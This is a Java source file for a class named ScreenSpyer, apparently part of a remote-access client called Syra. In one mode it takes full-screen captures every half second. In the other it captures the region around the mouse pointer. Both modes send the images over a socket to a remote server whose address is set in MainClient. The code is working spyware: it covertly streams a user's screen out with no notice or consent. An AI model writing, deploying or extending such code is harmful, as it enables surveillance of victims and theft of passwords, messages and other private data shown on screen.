package SyraClientPackage;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.HeadlessException;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.PointerInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.swing.ImageIcon;

public class ScreenSpyer extends Thread {
    private final int type;
    private Socket socket;
    private ObjectOutputStream oos;
    private DataOutputStream dOut;
    private Robot robot;
    public ScreenSpyer(int i) {
    type = i;
    }
    @Override
    public void run() {
        System.out.println("Screen Spyer started..");
        if(type == 2)
            Spyerofscreen();
        else if(type == 3)
            Spyerofmouse();
        System.out.println("Screen Spyer Exited.");
    }
private void Spyerofscreen() {
        try {
            GraphicsEnvironment gEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice gDev = gEnv.getDefaultScreenDevice();
            robot = new Robot(gDev);
            socket = new Socket(MainClient.SYRA_IP,MainClient.SYRA_PORT);
            Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle rectangle = new Rectangle(dim);
            BufferedImage image;
            ImageIcon imageicon;
            dOut = new DataOutputStream(socket.getOutputStream());
            dOut.writeByte(2);
            dOut.writeInt(MainClient.SYRA_REMOTE);
            dOut.flush();
            oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeObject(rectangle);
            while(true) {
            image = robot.createScreenCapture(rectangle);
            imageicon = new ImageIcon(image);
            oos.writeObject(imageicon);
            oos.flush();
            oos.reset();
            //System.out.println("Screen Shot");
            Thread.sleep(500);
            }
        } catch (HeadlessException | AWTException | IOException | InterruptedException ex) {
            System.out.println("ScreenSpyer 2 : " + ex.toString());
        } finally {
            try {
                dOut.close();
                oos.close();
                socket.close();
            } catch (IOException ex) {
            }
        }
}
private void Spyerofmouse() {
    try {
        Thread.sleep(1000);
        GraphicsEnvironment gEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice gDev = gEnv.getDefaultScreenDevice();
        robot = new Robot(gDev);
        socket = new Socket(MainClient.SYRA_IP,MainClient.SYRA_PORT);
        dOut = new DataOutputStream(socket.getOutputStream());
        dOut.writeByte(3);
        dOut.writeInt(MainClient.SYRA_REMOTE);
        dOut.flush();
        oos = new ObjectOutputStream(socket.getOutputStream());
        Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
        int width = (int) (dim.getWidth()-60), height = (int) (dim.getHeight()-360), x, y;
        PointerInfo pi;
        Point p;
        BufferedImage image;
        ImageIcon imageicon;
        while(true) {
            pi = MouseInfo.getPointerInfo();
            p = pi.getLocation();
            x = p.x - 30;
            y = p.y - 180;
            if(x<0) x = 0;
            else if(x > width) x = width;
            if(y<0) y = 0;
            else if(y > height) y = height;
            image = robot.createScreenCapture(new Rectangle(x,y,60,360));
            imageicon = new ImageIcon(image);
            oos.writeObject(imageicon);
            oos.flush();
            oos.reset();
            //System.out.println("Mouse Shot");
            Thread.sleep(500);            
        }
    } catch(HeadlessException | AWTException | IOException | InterruptedException ex) {
        System.out.println("ScreenSpyer 3 : " + ex.toString());
    } finally {
        try {
                oos.close();
                socket.close();
            } catch (IOException ex) {
            }
    }
}
}
